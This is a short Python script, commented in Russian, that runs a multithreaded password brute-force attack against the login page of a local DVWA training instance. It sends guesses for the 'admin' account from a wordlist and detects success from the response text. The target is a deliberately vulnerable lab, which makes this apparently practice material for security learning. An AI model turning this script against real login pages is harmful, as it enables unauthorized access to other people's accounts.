import requests
from concurrent.futures import ThreadPoolExecutor
import threading

url = "http://localhost/dvwa/vulnerabilities/brute/"

username = "admin"

cookies = { 
    "PHPSESSID": "YOUR_SESSION_ID", # Чтобы найти YOUR_SESSION_ID - открываем браузер; открываем http://localhost/dvwa/vulnerabilities/brute;
    # F12; STORAGE; COOKIES; PHPSESSID находим значение, например: k7h3b8v2a5u91o1g9r2l6f4s
    "security": "low"
}

found = False
lock = threading.Lock()

def try_password(password):

    global found

    if found:
        return

    password = password.strip()

    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    try:
        r = requests.get(url, params=params, cookies=cookies, timeout=5)

        if "Username and/or password incorrect." not in r.text:

            with lock:
                if not found:
                    found = True
                    print("\n[SUCCESS] Password found:", password)

        else:
            print("[FAIL]", password)

    except Exception as e:
        print("Request error:", e)


def main():

    with open("passwords.txt") as f: # В txt файле можем поиграться со списком паролей
        passwords = f.readlines()

    with ThreadPoolExecutor(max_workers=20) as executor: # max_workers - регулятор скорости
        executor.map(try_password, passwords)


if __name__ == "__main__":
    main()